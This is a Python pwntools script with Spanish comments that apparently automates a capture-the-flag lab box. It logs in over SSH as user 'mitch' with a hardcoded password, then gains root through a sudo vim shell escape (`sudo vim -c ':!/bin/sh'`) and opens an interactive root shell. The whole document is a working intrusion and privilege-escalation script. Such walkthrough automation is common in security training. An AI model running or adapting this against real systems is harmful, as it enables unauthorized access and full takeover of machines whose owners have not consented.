#!/usr/bin/python3
#coding: utf-8

#Made by: WizzzStark


import requests
import pdb
import threading
import signal
import sys
import time

from pwn import *

ip_maquina='10.10.124.177'

def exit(sig, frame):
        print("\n [!] Saliendo...\n")
        sys.exit(1)


signal.signal(signal.SIGINT, exit)

if __name__=='__main__':

	p1 = log.progress("Pwn")
	p1.status("Ganando acceso al sistema")

	#Cambiar el host a la ip de la máquina
	shell = ssh(user='mitch', host=ip_maquina, port=2222, password='secret', timeout=5)

	if shell.sock is None:
		p1.failure("No fue posible acceder a la máquina")
	else:
		p1.success("Se ha ganado acceso como el usuario mitch")

	p2 = log.progress("Privilege Escalation")
	p2.status("Migrando al usuario root")
	time.sleep(2)

	sh = shell.process('/bin/sh')
	
	sh.sendline("sudo vim -c ':!/bin/sh'")
	p2.success("Se migró al usuario root correctamente")

	sh.interactive()

